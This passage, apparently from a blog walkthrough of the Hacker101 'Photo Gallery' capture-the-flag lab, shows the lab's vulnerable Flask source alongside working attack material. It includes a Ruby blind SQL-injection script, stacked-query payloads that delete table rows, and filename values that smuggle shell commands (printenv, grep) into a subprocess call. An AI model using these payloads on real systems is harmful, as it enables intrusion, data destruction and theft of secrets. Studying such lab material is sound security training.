class="cm-string">'&lt;i&gt;Space used: '</span> <span class="cm-operator">+</span> <span class="cm-variable">subprocess</span>.<span class="cm-property">check_output</span>(<span class="cm-string">'du -ch %s || exit 0'</span> <span class="cm-operator">%</span> <span class="cm-string">' '</span>.<span class="cm-property">join</span>(<span class="cm-string">'files/'</span> <span class="cm-operator">+</span> <span class="cm-variable">fn</span> <span class="cm-keyword">for</span> <span class="cm-variable">fn</span> <span class="cm-keyword">in</span> <span class="cm-variable">fns</span>), <span class="cm-variable">shell</span><span class="cm-operator">=</span><span class="cm-keyword">True</span>, <span class="cm-variable">stderr</span><span class="cm-operator">=</span><span class="cm-variable">subprocess</span>.<span class="cm-property">STDOUT</span>).<span class="cm-property">strip</span>().<span class="cm-property">rsplit</span>(<span class="cm-string">'\n'</span>, <span class="cm-number">1</span>)[<span class="cm-operator">-</span><span class="cm-number">1</span>] <span class="cm-operator">+</span> <span class="cm-string">'&lt;/i&gt;'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">17</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">rep</span> <span class="cm-operator">+=</span> <span class="cm-string">'&lt;/div&gt;\n'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">18</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">19</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-variable">home</span>.<span class="cm-property">replace</span>(<span class="cm-string">'$ALBUMS$'</span>, <span class="cm-variable">rep</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">20</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">21</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-meta">@app</span>.<span class="cm-property">route</span>(<span class="cm-string">'/fetch'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">22</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-keyword">def</span> <span class="cm-def">fetch</span>():</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">23</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">cur</span> <span class="cm-operator">=</span> <span class="cm-variable">getDb</span>().<span class="cm-property">cursor</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">24</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> <span class="cm-variable">cur</span>.<span class="cm-property">execute</span>(<span class="cm-string">'SELECT filename FROM photos WHERE id=%s'</span> <span class="cm-operator">%</span> <span class="cm-variable">request</span>.<span class="cm-property">args</span>[<span class="cm-string">'id'</span>]) <span class="cm-operator">==</span> <span class="cm-number">0</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">25</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">abort</span>(<span class="cm-number">404</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">26</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">27</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment"># It's dangerous to go alone, take this:</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">28</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment"># ^FLAG^hehehehe$FLAG$</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">29</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">30</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-variable">file</span>(<span class="cm-string">'./%s'</span> <span class="cm-operator">%</span> <span class="cm-variable">cur</span>.<span class="cm-property">fetchone</span>()[<span class="cm-number">0</span>].<span class="cm-property">replace</span>(<span class="cm-string">'..'</span>, <span class="cm-string">''</span>), <span class="cm-string">'rb'</span>).<span class="cm-property">read</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">31</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">32</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-keyword">if</span> <span class="cm-variable">__name__</span> <span class="cm-operator">==</span> <span class="cm-string">"__main__"</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">33</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">app</span>.<span class="cm-property">run</span>(<span class="cm-variable">host</span><span class="cm-operator">=</span><span class="cm-string">'0.0.0.0'</span>, <span class="cm-variable">port</span><span class="cm-operator">=</span><span class="cm-number">80</span>)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 18px; width: 1px; border-bottom: 12px solid transparent; top: 701px;"></div><div class="CodeMirror-gutters" style="height: 731px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div></div></code></pre><p>That file will also be important for Flag2.</p><h3 id="flag1-sqli-like-argument">Flag1: SQLi + LIKE argument</h3><p>Let's see those hints:</p><figure class="kg-card kg-image-card"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/flag1hints.png" class="kg-image" alt="" loading="lazy" width="557" height="89"></figure><p>This flag references that image that failes to load. </p><p>Had
+ to figure out a way to get the filename from that hidden kitty - the 
+filename turned out the be flag. I worked on the assumption that the 
+file name was what was triggering a 500 server error. If you try to get 
+that image the backend sends a 500 error which gave me an oracle, the 
+following explains the assumtions I used.</p><p>I wrote the following ruby script, it uses the <code>httparty</code> library to make a request to the challenge instance, the function <code>check?</code> creates the url by inserting the <code>str</code> variable into the request, we can use the <code>LIKE</code>
+ SQL command to match the current str to the filename, if the filename 
+contains the string inside the variable we should get a 500 server 
+error, the <code>response.code == 500</code> line will return true if 
+the response code is 500 and false if it is anything else, which is what
+ we want. The key here is knowing that the 500 error can be used to get 
+the filename.</p><p>I created the range of alphanumerical characters 
+including capital letters using a range in ruby, then I initialized the 
+payload variable which eventually would hold the complete payload. In 
+this infinite while loop, I’m sure there is a better way of doing this, I
+ tested each character in the range and passed it to the <code>check?</code>
+ function if it returned a 500 that character would get added to my 
+payload string and then I would test for the next character including 
+the previous successful one <code>payload+nextCharacter</code>, if the 
+character returned anything other than a 500 it would just get skipped, 
+iterating through these characters until nothing more was being added to
+ the string gave me the full filename - which turned out to be the flag.</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code><div class="CodeMirror cm-s-default"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 34px;"><textarea style="position: absolute; bottom: -1em; padding: 0px; width: 1px; height: 1em; outline: currentcolor none medium;" autocorrect="off" autocapitalize="none" spellcheck="false" tabindex="0" wrap="off"></textarea></div><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 12px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 30px;"><div style="height: 100%; min-height: 1px; width: 1015px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 12px; width: 12px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1" draggable="true"><div class="CodeMirror-sizer" style="margin-left: 30px; margin-bottom: -12px; border-right-width: 18px; min-height: 554px; min-width: 1015.4px; padding-right: 0px; padding-bottom: 12px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div style="position: relative; outline: currentcolor none medium;" role="presentation"><div class="CodeMirror-measure"><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>26</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor" style="left: 4px; top: 0px; height: 21px;">&nbsp;</div></div><div class="CodeMirror-code" role="presentation" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">require 'httparty'</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">def check?(str)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">  resp = HTTParty.get("http://&lt;your instanceip&gt;/&lt;instance id&gt;/fetch?id=-1 UNION SELECT filename FROM photos WHERE filename LIKE '#{str}%' AND id=3")</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">  puts resp.code.to_s</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">  if resp.code == 500</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    return true</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">  else</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    return false</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">  end</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">end</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">CHARSET = ('A'..'Z').to_a + ('a'..'z').to_a + ('0'..'9').to_a</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">payload = ''</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">16</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">loop do</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">17</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">  CHARSET.each do |c|</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">18</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    puts "Trying: #{c} for #{payload}"</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">19</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    test = payload + c</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">20</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    next unless check?(test.to_s)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">21</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">22</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    payload += c</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">23</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    puts payload</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">24</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    break</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">25</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">  end</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">26</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">end</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 18px; width: 1px; border-bottom: 12px solid transparent; top: 554px;"></div><div class="CodeMirror-gutters" style="height: 584px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div></div></code></pre><p>Running the script eventually returns the full flag(partial example): </p><figure class="kg-card kg-image-card"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/flag1-2.png" class="kg-image" alt="" loading="lazy" width="595" height="113"></figure><p>The script will eventually build up the flag by using the 500 error as an oracle.</p><h3 id="flag2-sqli-stacked-queries">Flag2: SQLi, Stacked queries</h3><p>And again, let me see those hints.</p><figure class="kg-card kg-image-card"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/flag2hints.png" class="kg-image" alt="" loading="lazy" srcset="Hacker%20101%20CTF%20Photo%20Gallery_files/flag2hints_002.png 600w, Hacker%20101%20CTF%20Photo%20Gallery_files/flag2hints.png 726w" sizes="(min-width: 720px) 720px" width="726" height="107"></figure><p>Assumption:<br>We have to update some document, and we also need to make sure we used stacked queries, and use the <code>commit</code>
+ command to &nbsp;apply the changes, there is something weird about that
+ subprocess call - it runs commands on the computer which is never a 
+good thing - also the way is written I think I can end the quote and add
+ my payload there by creating an album with a weird name.</p><p>Got to delete all images using:</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code>http://35.190.155.168:5001/8ab77dbb88/fetch?id=1;%20DELETE%20%20FROM%20photos;%20commit;</code></pre><p>Using
+ the ;DELETE FROM photos; commit; query I was able delete all images 
+from the photos table. I think the vulnerability in the way the size of 
+the albums gets calculated is here:</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code><div class="CodeMirror cm-s-default"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 34px;"><textarea style="position: absolute; bottom: -1em; padding: 0px; width: 1px; height: 1em; outline: currentcolor none medium;" autocorrect="off" autocapitalize="none" spellcheck="false" tabindex="0" wrap="off"></textarea></div><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 30px;"><div style="height: 100%; min-height: 1px; width: 1142px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1" draggable="true"><div class="CodeMirror-sizer" style="margin-left: 30px; margin-bottom: -12px; border-right-width: 18px; min-height: 29px; min-width: 1142.32px; padding-right: 0px; padding-bottom: 12px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div style="position: relative; outline: currentcolor none medium;" role="presentation"><div class="CodeMirror-measure"><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor" style="left: 4px; top: 0px; height: 21px;">&nbsp;</div></div><div class="CodeMirror-code" role="presentation"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-variable">rep</span> <span class="cm-operator">+=</span> <span class="cm-string">'&lt;i&gt;Space used: '</span> <span class="cm-operator">+</span> <span class="cm-variable">subprocess</span>.<span class="cm-property">check_output</span>(<span class="cm-string">'du -ch %s || exit 0'</span> <span class="cm-operator">%</span> <span class="cm-string">' '</span>.<span class="cm-property">join</span>(<span class="cm-string">'files/'</span> <span class="cm-operator">+</span> <span class="cm-variable">fn</span> <span class="cm-keyword">for</span> <span class="cm-variable">fn</span> <span class="cm-keyword">in</span> <span class="cm-variable">fns</span>), <span class="cm-variable">shell</span><span class="cm-operator">=</span><span class="cm-keyword">True</span>, <span class="cm-variable">stderr</span><span class="cm-operator">=</span><span class="cm-variable">subprocess</span>.<span class="cm-property">STDOUT</span>).<span class="cm-property">strip</span>().<span class="cm-property">rsplit</span>(<span class="cm-string">'\n'</span>, <span class="cm-number">1</span>)[<span class="cm-operator">-</span><span class="cm-number">1</span>] <span class="cm-operator">+</span> <span class="cm-string">'&lt;/i&gt;'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 18px; width: 1px; border-bottom: 12px solid transparent; top: 29px;"></div><div class="CodeMirror-gutters" style="height: 59px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div></div></code></pre><h4 id="let-s-walk-through-my-current-payload">Let's walk through my current payload</h4><p>The
+ following payload was used after I deleted all the tables, so it 
+failed. I had to rebuild the challenge and instead use an existing file.</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code>/fetch?id=1; INSERT INTO photos (title, filename) VALUES ('; ls')', 'cat.png'); commit;
+</code></pre><p>Not working:</p><ol><li>I get a 404 because it tries to find that id</li><li>The
+ payload is not correct, I think that I can close that subprocess 
+function by inserting a title containing the ‘;’ + the os command I want
+ to run and closing the ‘’)’ - I think this should execute the command I
+ want and send the result back</li></ol><p>Now let's fix those issues by restarting the challenge, and updating an existing file:</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code>fetch?id=1; UPDATE photos SET filename="; grep -r FLAG ." WHERE id=3; commit;
+</code></pre><p>This request will execute and update the filename of the image with <code>id=3</code> and then commit that change to the database.</p><p>However right now I can’t seem to find the flag that I need, also this was truncating my results because of this.</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code>strip().rsplit('\n', 1)[-1]
+</code></pre><p>I got around the truncated answers by using echo to print the results of the command I ran.</p><p>This is the payload that worked.</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code>fetch?id=3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
+// payload worked - all 3 flags in printenv
+</code></pre><p>This payload sets the filename to <code>;echo $(printenv)</code> for the image with the <code>id=3</code> which gets injected in the source code we found in Flag0:</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code><div class="CodeMirror cm-s-default"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 34px;"><textarea style="position: absolute; bottom: -1em; padding: 0px; width: 1px; height: 1em; outline: currentcolor none medium;" autocorrect="off" autocapitalize="none" spellcheck="false" tabindex="0" wrap="off"></textarea></div><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 30px;"><div style="height: 100%; min-height: 1px; width: 1142px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1" draggable="true"><div class="CodeMirror-sizer" style="margin-left: 30px; margin-bottom: -12px; border-right-width: 18px; min-height: 50px; min-width: 1142.32px; padding-right: 0px; padding-bottom: 12px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div style="position: relative; outline: currentcolor none medium;" role="presentation"><div class="CodeMirror-measure"><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor" style="left: 4px; top: 0px; height: 21px;">&nbsp;</div></div><div class="CodeMirror-code" role="presentation"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-variable">rep</span> <span class="cm-operator">+=</span> <span class="cm-string">'&lt;i&gt;Space used: '</span> <span class="cm-operator">+</span> <span class="cm-variable">subprocess</span>.<span class="cm-property">check_output</span>(<span class="cm-string">'du -ch %s || exit 0'</span> <span class="cm-operator">%</span> <span class="cm-string">' '</span>.<span class="cm-property">join</span>(<span class="cm-string">'files/'</span> <span class="cm-operator">+</span> <span class="cm-variable">fn</span> <span class="cm-keyword">for</span> <span class="cm-variable">fn</span> <span class="cm-keyword">in</span> <span class="cm-variable">fns</span>), <span class="cm-variable">shell</span><span class="cm-operator">=</span><span class="cm-keyword">True</span>, <span class="cm-variable">stderr</span><span class="cm-operator">=</span><span class="cm-variable">subprocess</span>.<span class="cm-property">STDOUT</span>).<span class="cm-property">strip</span>().<span class="cm-property">rsplit</span>(<span class="cm-string">'\n'</span>, <span class="cm-number">1</span>)[<span class="cm-operator">-</span><span class="cm-number">1</span>] <span class="cm-operator">+</span> <span class="cm-string">'&lt;/i&gt;'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">rep</span> <span class="cm-operator">+=</span> <span 